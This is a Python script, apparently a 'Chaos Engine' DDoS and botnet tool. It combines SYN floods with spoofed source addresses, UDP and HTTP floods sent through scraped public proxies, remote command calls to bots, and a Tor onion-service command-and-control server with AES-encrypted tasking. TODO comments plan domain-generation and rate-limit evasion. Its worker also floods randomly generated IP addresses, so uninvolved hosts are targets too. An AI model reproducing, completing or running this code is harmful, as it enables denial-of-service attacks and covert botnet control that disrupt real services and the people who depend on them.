import threading
import random
import time
import socket
import json
import asyncio
import aiohttp
import requests
from bot1 import ChaosBot
import ssl
from scapy.all import IP, TCP, UDP, send
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from torpy import TorClient

# Configuration
TARGET_SERVER = "example.com"  # Replace with your target
TARGET_PORTS = [80, 443, 12345]  # Multi-port attack
THREADS = 200  # More threads, more chaos
REQUESTS_PER_THREAD = 2000  # Double the document's intensity
PROTOCOLS = ["TCP", "UDP", "HTTP"]  # Multi-vector attack
USE_PROXIES = True  # Anonymity enabled
RANDOM_IP = True  # IP spoofing
PAYLOAD_SIZE = 2048  # Bigger payloads
PROXY_LIST_URL = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http"
TOR_C2 = True  # Dynamic C2 via Tor

# Global state
proxies = []
botnet_clients = {}
tasks = {}
aes_key = get_random_bytes(16)  # Shared encryption key

# Proxy Fetching
def fetch_proxies():
    global proxies
    response = requests.get(PROXY_LIST_URL)
    proxies = response.text.splitlines()
    print(f"Fetched {len(proxies)} proxies.")

# Random IP Generator
def random_ip():
    return f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

# Payload Obfuscation
def obfuscate_payload(payload):
    return payload + str(random.randint(0, 9999)).encode()

# TCP SYN Flood
def send_tcp_syn(ip, port):
    pkt = IP(src=random_ip() if RANDOM_IP else "127.0.0.1", dst=ip) / TCP(dport=port, flags="S", seq=random.randint(0, 2**32))
    send(pkt, verbose=False)

# UDP Flood
def send_udp_packet(ip, port, payload):
    pkt = IP(dst=ip) / UDP(dport=port) / payload
    send(pkt, verbose=False)

# HTTP Flood (Async)
async def http_flood(ip, port, session, payload):
    proxy = {"http": f"http://{random.choice(proxies)}"} if USE_PROXIES else None
    try:
        async with session.get(f"http://{ip}:{port}", data=payload, proxy=proxy.get("http") if proxy else None) as resp:
            status = resp.status
            print(f"HTTP Flood - Status: {status}")
    except Exception:
        print("HTTP Flood: Target resisted.")

# Botnet Command Execution
def execute_bot_command(ip, port, command):
    try:
        response = requests.post(f"http://{ip}:{port}/execute", data={"cmd": command}, timeout=5, proxies={"http": random.choice(proxies)})
        print(f"Bot Command Response: {response.text}")
    except:
        print("Bot command failed.")

# Core Attack Function
def network_chaos_worker():
    payload = b"CHAOS" * (PAYLOAD_SIZE // 5)
    if PAYLOAD_SIZE:
        payload = obfuscate_payload(payload)
    
    for _ in range(REQUESTS_PER_THREAD):
        ip = random_ip() if RANDOM_IP else TARGET_SERVER
        port = random.choice(TARGET_PORTS)
        protocol = random.choice(PROTOCOLS)
        
        if protocol == "TCP":
            send_tcp_syn(ip, port)
        elif protocol == "UDP":
            send_udp_packet(ip, port, payload)
        elif protocol == "HTTP":
            asyncio.run(http_flood(ip, port, aiohttp.ClientSession(), payload))
        execute_bot_command(ip, port, "echo 'CHAOS ENGINE ACTIVE'")

# Tor-based Dynamic C2 Server
class ChaosC2Server:
    """
    TODO: 
    Add DGA: Implement a simple DGA in ChaosC2Server to rotate onion addresses.
    Improve Flooding: Randomize packet timing and sizes in network_chaos_worker to evade rate-limiting defenses.
    Secure Tor: Generate fresh .crt and .key files dynamically for each C2 instance.
    """
    
    def __init__(self):
        self.tor = TorClient()
        self.onion_addr = None
    
    def start(self):
        with self.tor.create_circuit() as circuit:
            self.onion_addr = circuit.create_onion_service(8443)
            print(f"C2 Online at: {self.onion_addr}")
            self.run_server()
    
    def run_server(self):
        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        context.load_cert_chain(certfile="server.crt", keyfile="server.key")
        
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind(('0.0.0.0', 8443))
            s.listen(10)
            s_ssl = context.wrap_socket(s, server_side=True)
            while True:
                client, addr = s_ssl.accept()
                threading.Thread(target=self.handle_client, args=(client, addr)).start()
    
    def handle_client(self, client, addr):
        while True:
            try:
                data = client.recv(1024).decode()
                if not data:
                    break
                msg = json.loads(data)
                if msg["type"] == "CHECK_IN":
                    botnet_clients[msg["client_id"]] = client
                    print(f"Bot {msg['client_id']} checked in from {addr}")
                elif msg["type"] == "TASK_COMPLETE":
                    tasks[msg["task_id"]]["result"] = msg["result"]
                    print(f"Task {msg['task_id']} completed: {msg['result']}")
                elif msg["type"] == "GET_TASK":
                    self.send_task(client)
            except:
                break
        client.close()
    
    def send_task(self, client):
        task_id = random.randint(1, 10000)
        tasks[task_id] = {"command": "Flood target", "status": "PENDING"}
        encrypted = self.encrypt(json.dumps({"task_id": task_id, "command": tasks[task_id]["command"]}))
        client.sendall(encrypted)
    
    def encrypt(self, msg):
        cipher = AES.new(aes_key, AES.MODE_EAX)
        nonce, ciphertext, tag = cipher.nonce, *cipher.encrypt_and_digest(msg.encode())
        return json.dumps({"nonce": nonce.hex(), "ciphertext": ciphertext.hex(), "tag": tag.hex()}).encode()


# Main Execution
def unleash_chaos():
    if USE_PROXIES:
        fetch_proxies()
    
    # Start C2 Server in a thread
    c2 = ChaosC2Server()
    threading.Thread(target=c2.start, daemon=True).start()
    time.sleep(5)  # Let C2 spin up
    
    # Spawn bot clients
    for i in range(5):
        bot = ChaosBot(f"Bot-{i}", c2.onion_addr)
        threading.Thread(target=bot.connect, daemon=True).start()
    
    # Launch attack threads
    threads = []
    for _ in range(THREADS):
        t = threading.Thread(target=network_chaos_worker, daemon=True)
        t.start()
        threads.append(t)
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nChaos Engine shutting down...")

if __name__ == "__main__":
    unleash_chaos()